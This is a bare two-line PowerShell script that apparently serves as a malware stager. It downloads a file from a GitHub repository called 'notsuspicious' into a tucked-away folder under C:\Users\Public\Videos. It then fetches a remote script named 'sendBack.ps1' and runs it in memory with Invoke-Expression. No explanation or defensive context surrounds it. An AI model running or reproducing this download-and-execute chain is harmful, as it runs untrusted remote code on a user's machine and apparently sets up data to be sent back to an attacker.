Invoke-WebRequest "https://github.com/RaupenInspektor/notsuspicious/raw/main/url.txt" -OutFile "C:\Users\Public\Videos\GraphicalUserInterface\url.txt" -UseBasicParsing
Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/sendBack.ps1" -UseBasicParsing).Content
